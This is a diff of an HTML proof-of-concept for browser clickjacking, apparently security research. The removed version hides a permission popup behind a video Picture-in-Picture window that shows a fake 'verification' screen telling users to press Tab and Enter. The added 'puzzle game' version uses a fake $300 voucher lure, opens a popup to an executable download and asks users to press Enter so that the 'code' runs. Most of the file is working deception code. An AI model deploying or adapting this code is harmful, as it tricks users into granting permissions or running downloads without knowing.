@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Video PiP Overlap PoC v2</title>
+  <title>Simple Puzzle Game</title>
   <style>
     body {
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
@@ -15,198 +15,157 @@
       background-color: #f0f0f0;
       font-family: Arial, sans-serif;
     }
-    h2 { margin-bottom: 20px; }
-    .btn {
-      padding: 14px 32px;
-      font-size: 17px;
+
+    #puzzle-content {
+      display: none;
+      text-align: center;
+    }
+
+    .emoji {
+      font-size: 100px;
+      margin: 0 10px;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
       cursor: pointer;
       background-color: #0dd438;
       color: white;
       border: none;
       border-radius: 5px;
-      margin: 5px;
     }
-    p { max-width: 500px; text-align: center; color: #666; margin-top: 16px; font-size: 14px; }
-    /* Hidden elements */
-    #canvas, #video { position: fixed; left: -9999px; top: -9999px; }
   </style>
 </head>
+
 <body>
-  <center style="position: absolute; top: 250px;">
-    <h2>Site Verification Required</h2>
-  </center>
-  <button class="btn" id="verify-btn">Verify</button>
-  <p>
-    <b>How it works:</b> Video PiP opens in bottom-right corner (always-on-top).
-    The tiny permission popup opens at the <b>same spot</b> — hidden behind the PiP.
-    Tab/Enter reach the permission prompt because Video PiP never steals keyboard focus.
-  </p>
-  <canvas id="canvas" width="800" height="600"></canvas>
-  <video id="video" muted autoplay></video>
+  <button id="open-pip-button" onclick="openPip()">Play PoC Game</button>
+
   <script>
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const video = document.getElementById('video');
-    let popupWindow = null;
-    let currentStep = 1;
-    let animFrame = null;
-    /* ═══ Drawing functions ═══ */
-    function draw() {
-      ctx.fillStyle = '#f0f0f0';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = '#333';
-      ctx.font = 'bold 36px Arial';
-      ctx.textAlign = 'center';
-      ctx.fillText('2-Step Verification', canvas.width / 2, 70);
-      ctx.strokeStyle = '#ddd';
-      ctx.beginPath();
-      ctx.moveTo(60, 95);
-      ctx.lineTo(canvas.width - 60, 95);
-      ctx.stroke();
-      if (currentStep === 1) {
-        drawStep1();
-      } else if (currentStep === 2) {
-        drawStep2();
-      } else {
-        drawDone();
-      }
-      animFrame = requestAnimationFrame(draw);
-    }
-    function drawStep1() {
-      ctx.fillStyle = '#0dd438';
-      ctx.font = 'bold 28px Arial';
-      ctx.fillText('Step 1 of 2', canvas.width / 2, 150);
-      ctx.fillStyle = '#222';
-      ctx.font = '24px Arial';
-      ctx.fillText('Press the Tab key 3 times,', canvas.width / 2, 220);
-      ctx.fillText('then press Enter to continue.', canvas.width / 2, 260);
-      // Key visuals
-      let x = 180;
-      drawKeyBox(x, 310, 'Tab'); x += 80;
-      drawKeyBox(x, 310, 'Tab'); x += 80;
-      drawKeyBox(x, 310, 'Tab'); x += 65;
-      ctx.fillStyle = '#999';
-      ctx.font = '28px Arial';
-      ctx.fillText('→', x + 10, 338); x += 50;
-      drawKeyBox(x, 310, 'Enter', 90);
-      // Pulse dot
-      const a = 0.5 + 0.5 * Math.sin(Date.now() / 300);
-      ctx.fillStyle = `rgba(13, 212, 56, ${a})`;
-      ctx.beginPath();
-      ctx.arc(canvas.width / 2, 420, 16, 0, Math.PI * 2);
-      ctx.fill();
-      ctx.fillStyle = '#888';
-      ctx.font = '18px Arial';
-      ctx.fillText('Waiting for input…', canvas.width / 2, 470);
-    }
-    function drawStep2() {
-      ctx.fillStyle = '#0dd438';
-      ctx.font = 'bold 28px Arial';
-      ctx.fillText('Step 2 of 2', canvas.width / 2, 150);
-      ctx.fillStyle = '#222';
-      ctx.font = '24px Arial';
-      ctx.fillText('Press Enter twice to', canvas.width / 2, 220);
-      ctx.fillText('complete verification.', canvas.width / 2, 260);
-      drawKeyBox(300, 310, 'Enter', 90);
-      drawKeyBox(410, 310, 'Enter', 90);
-      const a = 0.5 + 0.5 * Math.sin(Date.now() / 300);
-      ctx.fillStyle = `rgba(13, 212, 56, ${a})`;
-      ctx.beginPath();
-      ctx.arc(canvas.width / 2, 410, 16, 0, Math.PI * 2);
-      ctx.fill();
-      ctx.fillStyle = '#888';
-      ctx.font = '18px Arial';
-      ctx.fillText('Almost done…', canvas.width / 2, 460);
-    }
-    function drawDone() {
-      ctx.fillStyle = '#0dd438';
-      ctx.font = 'bold 40px Arial';
-      ctx.fillText('✓ Verified!', canvas.width / 2, 280);
-      ctx.fillStyle = '#888';
-      ctx.font = '22px Arial';
-      ctx.fillText('You may close this window.', canvas.width / 2, 340);
-    }
-    function drawKeyBox(x, y, label, w) {
-      w = w || 65;
-      ctx.fillStyle = '#fff';
-      ctx.strokeStyle = '#aaa';
-      ctx.lineWidth = 2;
-      roundRect(x, y, w, 44, 8);
-      ctx.fill();
-      ctx.stroke();
-      ctx.fillStyle = '#333';
-      ctx.font = 'bold 18px Arial';
-      ctx.textAlign = 'center';
-      ctx.fillText(label, x + w / 2, y + 29);
-    }
-    function roundRect(x, y, w, h, r) {
-      ctx.beginPath();
-      ctx.moveTo(x + r, y);
-      ctx.lineTo(x + w - r, y);
-      ctx.quadraticCurveTo(x + w, y, x + w, y + r);
-      ctx.lineTo(x + w, y + h - r);
-      ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
-      ctx.lineTo(x + r, y + h);
-      ctx.quadraticCurveTo(x, y + h, x, y + h - r);
-      ctx.lineTo(x, y + r);
-      ctx.quadraticCurveTo(x, y, x + r, y);
-      ctx.closePath();
-    }
-    /* ═══ Main trigger ═══ */
-    document.getElementById('verify-btn').addEventListener('click', async () => {
-      currentStep = 1;
-      draw();
-      // Canvas → video stream at 30fps
-      const stream = canvas.captureStream(30);
-      video.srcObject = stream;
-      await video.play();
-      // Enter Video PiP — always on top, does NOT steal keyboard focus
-      try {
-        await video.requestPictureInPicture();
-      } catch (e) {
-        console.error('PiP failed:', e);
-        return;
-      }
-      // Calculate bottom-right corner position (where PiP naturally appears)
-      // PiP default size is ~20% of screen = ~384x216 on 1920x1080
-      // We position the permission popup inside that zone
-      const sw = screen.availWidth || screen.width;
-      const sh = screen.availHeight || screen.height;
-      // Popup goes to the bottom-right corner, matching PiP's default position
-      const popLeft = sw - 200;
-      const popTop = sh - 200;
-      // Open tiny permission popup AT the bottom-right corner
-      // (exactly where Video PiP appears by default)
-      popupWindow = window.open(
-        'permission.html',
-        'permPopup',
-        `width=100,height=100,left=${popLeft},top=${popTop}`
-      );
-      // The permission popup has keyboard focus (it was opened last).
-      // Video PiP stays on top visually — covering the popup.
-      // Tab/Enter keystrokes go to the permission popup
-      // (because Video PiP NEVER takes keyboard focus).
-      // Poll to detect when permission is granted (popup closes itself)
-      const poll = setInterval(() => {
-        if (popupWindow && popupWindow.closed) {
-          clearInterval(poll);
-          popupWindow = null;
-          currentStep = 3;
-          // Exit PiP after showing "Verified"
-          setTimeout(() => {
-            cancelAnimationFrame(animFrame);
-            if (document.pictureInPicture) {
-              document.exitPictureInPicture().catch(() => {});
-            }
-          }, 2000);
+    let gameState = 0;
+    let pipWindow;
+
+    async function openPip() {
+      pipWindow = await documentPictureInPicture.requestWindow({
+        width: 1000,
+        height: 1000,
+      });
+
+      // Add styles to the PiP window
+      const style = pipWindow.document.createElement('style');
+      style.textContent = `
+                body {
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    margin: 0;
+                    background-color: #f0f0f0;
+                    font-family: Arial, sans-serif;
+                    position: relative;
+                }
+                #bug-icon {
+                    position: absolute;
+                    top: 10px;
+                    left: 10px;
+                    font-size: 50px;
+                    cursor: pointer;
+                    transition: transform 0.3s;
+                }
+                #bug-icon:hover {
+                    transform: scale(1.2);
+                }
+                #puzzle-content {
+                    text-align: center;
+                    user-select: none;
+                }
+                #final-message {
+                    display: none;
+                    position: absolute;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    font-size: 24px;
+                    font-weight: bold;
+                }
+                #bug-bottom {
+                    display: none;
+                    position: absolute;
+                    bottom: 10px;
+                    left: 10px;
+                    font-size: 50px;
+                    cursor: pointer;
+                    transition: transform 0.3s;
+                }
+                #bug-bottom:hover {
+                    transform: scale(1.2);
+                }
+                #center-text {
+                    position: absolute;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    font-size: 24px;
+                    font-weight: bold;
+                }
+            `;
+      pipWindow.document.head.appendChild(style);
+
+      // Clone and display the puzzle content in the PiP window
+      const puzzleContent = document.getElementById('puzzle-content').cloneNode(true);
+      puzzleContent.style.display = 'block'; // Show the puzzle content when the game starts
+      pipWindow.document.body.appendChild(puzzleContent);
+
+      // Adding event listeners within the PiP window
+      const bugIcon = pipWindow.document.getElementById('bug-icon');
+      const bugBottom = pipWindow.document.getElementById('bug-bottom');
+
+      bugIcon.addEventListener('click', startPuzzle);
+      bugBottom.addEventListener('click', showFinalMessage);
+
+      pipWindow.addEventListener('keydown', (event) => {
+        if (event.key === 'Enter') {
+          pipWindow.close();
+          setTimeout(() => {document.write("<h2>Code Executed.</h2>");}, 500);
         }
-      }, 300);
-    });
-    // Cleanup if PiP is manually closed
-    video.addEventListener('leavepictureinpicture', () => {
-      cancelAnimationFrame(animFrame);
-      if (popupWindow && !popupWindow.closed) popupWindow.close();
-    });
+      });
+    }
+
+    function startPuzzle() {
+      window.open('https://live.sysinternals.com/adrestore.exe', 'popupWindow', 'width=100,height=100,left=1000,top=250');
+      const bugIcon = pipWindow.document.getElementById('bug-icon');
+      const centerText = pipWindow.document.getElementById('center-text');
+      const bugBottom = pipWindow.document.getElementById('bug-bottom');
+
+      // Hide the initial bug and center text
+      bugIcon.style.display = 'none';
+      centerText.style.display = 'none';
+
+      // Display the bottom left bug
+      bugBottom.style.display = 'block';
+      gameState = 1;
+    }
+
+    function showFinalMessage() {
+      const bugBottom = pipWindow.document.getElementById('bug-bottom');
+      const finalMessage = pipWindow.document.getElementById('final-message');
+
+      // Hide the bottom left bug
+      bugBottom.style.display = 'none';
+
+      // Show the final message
+      finalMessage.style.display = 'block';
+      gameState = 2;
+    }
+
   </script>
+
+  <div id="puzzle-content">
+    <div id="bug-icon">💰</div>
+    <div id="bug-bottom">💰</div>
+    <div id="center-text">Click all 💰 to collect your reward!</div>
+    <div id="final-message">🎉 Yay! You've won a $300 gift voucher! Press Enter twice to claim it.</div>
+  </div>
 </body>
+
 </html>
